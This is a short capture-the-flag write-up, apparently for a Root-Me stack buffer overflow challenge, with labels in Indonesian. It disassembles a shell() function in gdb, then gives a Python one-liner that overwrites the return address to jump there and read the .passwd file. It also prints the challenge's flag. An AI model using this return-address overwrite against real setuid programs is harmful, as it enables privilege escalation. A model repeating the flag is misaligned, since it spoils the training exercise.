<h1>ELF x86 - Stack buffer overflow basic 2</h1>
<h3>Description</h3>

```c
```
<h3>Solution</h3>
<label>Cek fungsi shell() di gdb dan exploit</label>

```console
app-systeme-ch15@challenge02:~$ gdb -q ch15
Reading symbols from ch15...(no debugging symbols found)...done.
(gdb) disas shell
Dump of assembler code for function shell:
   0x08048516 <+0>:	push   %ebp
   0x08048517 <+1>:	mov    %esp,%ebp
   0x08048519 <+3>:	push   %esi
   0x0804851a <+4>:	push   %ebx
   0x0804851b <+5>:	call   0x8048450 <__x86.get_pc_thunk.bx>
   0x08048520 <+10>:	add    $0x1ae0,%ebx
   0x08048526 <+16>:	call   0x80483a0 <geteuid@plt>
   0x0804852b <+21>:	mov    %eax,%esi
   0x0804852d <+23>:	call   0x80483a0 <geteuid@plt>
   0x08048532 <+28>:	sub    $0x8,%esp
   0x08048535 <+31>:	push   %esi
   0x08048536 <+32>:	push   %eax
   0x08048537 <+33>:	call   0x80483d0 <setreuid@plt>
   0x0804853c <+38>:	add    $0x10,%esp
   0x0804853f <+41>:	sub    $0xc,%esp
   0x08048542 <+44>:	lea    -0x1990(%ebx),%eax
   0x08048548 <+50>:	push   %eax
   0x08048549 <+51>:	call   0x80483c0 <system@plt>
   0x0804854e <+56>:	add    $0x10,%esp
   0x08048551 <+59>:	nop
   0x08048552 <+60>:	lea    -0x8(%ebp),%esp
   0x08048555 <+63>:	pop    %ebx
---Type <return> to continue, or q <return> to quit---q
Quit
```
<label>Alamat fungsi shell() = 0x08048516</label>

```console
app-systeme-ch15@challenge02:~$ (python -c "print('A'*128 + '\x16\x85\x04\x08')"; echo cat .passwd) | ./ch15 
B33r1sSoG0oD4y0urBr4iN
Segmentation fault
```
<h3>Flag</h3>
<pre>
B33r1sSoG0oD4y0urBr4iN
</pre>
